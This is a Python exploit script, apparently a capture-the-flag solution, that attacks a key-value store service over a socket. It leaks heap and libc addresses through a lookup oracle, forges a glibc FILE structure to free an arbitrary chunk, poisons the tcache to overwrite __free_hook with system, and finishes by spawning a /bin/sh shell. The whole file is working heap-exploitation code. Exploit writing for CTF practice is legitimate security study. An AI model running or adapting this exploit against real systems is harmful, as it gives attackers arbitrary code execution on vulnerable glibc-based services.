import os
from ptrlib import *

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9005")

def add(key, value):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("Key: ", key)
    sock.sendlineafter("Value: ", str(value))
def get(key):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("Key: ", key)
    return sock.recvline() != b'Item not found'
def delete(key):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("Key: ", key)
def save():
    sock.sendlineafter("> ", "4")
def fclose():
    sock.sendlineafter("> ", "5")
    sock.sendlineafter("[y/N]\n", "n")

libc = ELF("../distfiles/libc-2.31.so")
sock = Socket(HOST, int(PORT))

"""
1. Leak heap/libc address
"""
# (a) Leak heap address
add("B", 3.14)
payload  = b'B' + b'\0'*0x77
payload += p64(0x21)
leak = b''
for r in [[0x80],range(256),range(256),range(256),range(256),[0x55,0x56]]:
    for c in r:
        if not is_getline_safe(chr(c)):
            continue
        if get(payload + leak + bytes([c])):
            logger.info(f"Found: 0x{c:02x}")
            leak += bytes([c])
            break
    else:
        logger.warn("Bad luck!")
        exit(1)
heap_base = u64(leak) - 0x480
logger.info("heap = " + hex(heap_base))

# (b) Leak libc address
add("X"*0x80, 3.14)
add("Y", 3.14)
add(b"Z"*0x6f8+p64(0x501), 3.14) # fake chunk [Z] to free later
delete("X"*0x80)
delete(b"Z"*0x6f8+p64(0x501))
payload  = b'Y' + b'\0'*0x77
payload += p64(0x21)
payload += p64(heap_base + 0xd40) + p64(3.14)
payload += p64(heap_base + 0x500) + p64(0x791)
leak = b''
for r in [[(libc.main_arena() + 0x530) & 0xff], range(256),
          range(256), range(256), range(256), [0x7f]]:
    for c in r:
        if not is_getline_safe(chr(c)):
            continue
        if get(payload + leak + bytes([c])):
            logger.info(f"Found: 0x{c:02x}")
            leak += bytes([c])
            break
    else:
        logger.warn("Bad luck!")
        exit(1)
libc_base = u64(leak) - libc.main_arena() - 0x530
libc.set_base(libc_base)
add("A"*0x80, 3.14)

"""
2. Get Arbitrary-Address-Free Primitive
"""
## (a) fill tcache for 0x1e0
## (I'm not good at heap stuff. Probably there are some better ways.)
# 1
fclose()
save()
add("nya", 3.14)
delete("nya")
# 2
fclose()
add("0"*0x400, 3.14)
save()
add("nya", 3.14)
delete("nya")
# 3
fclose()
add("0"*0x400, 3.14)
add("0"*0x400, 3.14)
save()
add("nya", 3.14)
delete("nya")
# 4
fclose()
add("0"*0x1000, 3.14)
save()
add("nya", 3.14)
delete("nya")
# 5
fclose()
add("0"*0x1000, 3.14)
save()
add("nya", 3.14)
delete("nya")
# 6
fclose()
add("0"*0x1000, 3.14)
save()
add("nya", 3.14)
delete("nya")
# 7
fclose()
add("0"*0x1000, 3.14)
save()
add("nya", 3.14)
delete("nya")
# unsortedbin
fclose()
# link ^ to smallbin
add("1"*0x1e0, 3.14)
delete("1"*0x1e0)

## (b) Overwrite FILE structure
target = heap_base + 0x1c90 # where to free
payload = flat([
    0xfbad2488, target, # 0x00
    target, target,
    target, target,
    target, target,
    target, 0,
    0, 0,
    0, libc.symbol('_IO_2_1_stderr_'),
    3, 0,
    0, heap_base + 0x290 + 0xf0, # 0x80
    -1, 0,
    heap_base + 0x290 + 0x100, 0,
    0, 0,
    -1, 0,
    0, libc_base + 0x1e94a0 # _IO_file_jumps
], map=p64)
add(payload, 3.14)
fclose() # free [Z]

"""
3. tcache poisoning
"""
delete(p64(heap_base + 0x3d50))
payload  = b"R"*0x88 + p64(0x21)
payload += p64(libc.symbol("__free_hook") - 8)
payload += b"R"*0x50
payload += p64(0x21)
payload += p64(heap_base) + p64(1.23)
payload += p64(0) + b'\x21'
get(payload)
add("S", 3.14)
add("T", u64(p64(libc.symbol("system")), type=float))

## win!
delete("/bin/sh")

sock.interactive()
